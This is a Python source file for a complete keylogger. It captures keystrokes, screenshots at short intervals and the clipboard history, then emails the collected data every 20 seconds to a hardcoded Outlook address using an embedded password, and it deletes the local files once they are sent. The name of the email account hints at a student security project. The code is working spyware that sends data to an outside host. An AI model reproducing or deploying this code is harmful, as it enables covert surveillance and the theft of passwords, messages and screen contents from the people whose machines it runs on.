import keyboard
import smtplib # SMTP (Simple Mail Tranfer Protocol)
import os
import pyperclip
import sounddevice
from scipy.io.wavfile import write
from threading import Timer, Thread
from datetime import datetime
from os.path import basename
from PIL import ImageGrab
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#PARAMATERS
INTERVAL = 20 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "SomethingAwesome6441@outlook.com"
EMAIL_PASSWORD = "ThisIsAStrongPassword"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # the interval a report is sent
        self.interval = interval
        # how the key strokes are reported
        self.report_method = report_method
        # log of all the keystrokes within `self.interval`
        self.log = ""
        # list of all attachments
        self.attachments = []
        # list of clipboard history
        self.clipboard_history = []
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    '''
    update_log: updates the log
    Args:
    - event: the on press event
    '''
    def update_log(self, event):
        name = event.name
        # special key is pressed (e.g ctrl, alt, etc.)
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "decimal":
                name = "."
            else:
                # special keys
                # replace spaces with underscores
                name = name.replace(" ", "_")
                # change to uppercase with []
                name = f"[{name.upper()}]"
                if name == "[ENTER]":
                    # add a new line whenever an ENTER is pressed 
                    name += "\n"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    '''
    prepare_email: formats the email
    Args:
    - message: the key log
    Return:
    - returns the formatted email as a string
    '''
    def prepare_email(self, message, files, clipboard):
        # create mail
        email = MIMEMultipart("alternative")
        email["From"] = EMAIL_ADDRESS
        email["To"] = EMAIL_ADDRESS
        email["Subject"] = "Keylogger logs"
        
        # create message (text and html versions)
        text = MIMEText(message, "plain")
        html = MIMEText(f"<h2><b>Key Log:</b></h2><p>{message}</p>", "html")
        email.attach(text)
        email.attach(html)
        # create a file with current clipboards
        if clipboard:
            with open("file_attachments/clipboard.txt", "w") as clipboard_file:
                for clip in clipboard:
                    clipboard_file.write(f"{clip}\n")
            files.append("file_attachments/clipboard.txt")
        
        # add file attachments to email
        for file in files:
            # open file with read and binary mode
            f = open(file, "rb")
            attachment = MIMEApplication(f.read(), Name = basename(file))
            f.close()
            os.remove(f'{file}')
            # After the file is closed
            attachment['Content-Disposition'] = f'attachment; filename="{basename(file)}"'
            email.attach(attachment)

        # convert mail to string message
        return email.as_string()

    '''
    send_email: sends the email
    Args:
    - message: the key log
    Return:
    - returns the formatted email as a string
    '''
    def send_email(self, email, password, message, files, clipboard, verbose=1):
        # manages a connection to an SMTP server (for Microsoft365, Outlook, Hotmail, and live.com)
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to email account
        server.login(email, password)
        # send email
        server.sendmail(email, email, self.prepare_email(message, files, clipboard))
        # terminates the session
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} with {len(files)} files attached, and containing the message:  {message}")

    def report(self):
        # report log if there is something in the log
        if self.log or self.attachments or self.clipboard_history:
            self.end_dt = datetime.now()
            # self.update_filename()
            # if self.report_method == "email":
            self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log, self.attachments, self.clipboard_history)
            # elif self.report_method == "file":
            #     self.report_to_file()
            # if you don't want to print in the console, comment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
            #reset log and attachments
            self.log = ""
            self.attachments = []
            self.clipboard_history = []
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def capture_img(self):
        if not os.path.exists("file_attachments"):
            os.mkdir("file_attachments") # make attachment directory in current directory
        # capture screen shot
        dt = f'{datetime.now()}'
        img = ImageGrab.grab()
        img_name = f'file_attachments/screenshot{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.png'
        self.attachments.append(img_name)
        img.save(img_name)

        # set interval for screen capture
        if self.interval/2 > 5:
            interval = 5
        else:
            interval = self.interval/2
        timer = Timer(interval=interval, function=self.capture_img)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
    
    def copy_clipboard(self):
        while True:
            self.clipboard_history.append(pyperclip.waitForNewPaste())
        # if self.clipboard_history == [] or pyperclip.paste() != self.clipboard_history[-1]:
    
    # def record_microphone(self):
    #     # Sampling frequency
    #     freq = 44100
    #     # Recording duration
    #     duration = 10
    #     recording = sounddevice.rec(int(duration * freq), samplerate=freq, channels=2)
    #     sounddevice.wait(f"")

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(self.update_log)
        # start reporting the keylogs
        self.report()
        # start capturing clipboard
        clipboard_thread = Thread(target=self.copy_clipboard)
        clipboard_thread.daemon = True
        clipboard_thread.start()
        # start capturing the screen
        self.capture_img()

        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


    # def update_filename(self):
    #     # construct the filename to be identified by start & end datetimes
    #     start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
    #     end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
    #     self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    
    ''' For reporting to a local file
    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    '''

if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=INTERVAL, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(INTERVAL)
    keylogger.start()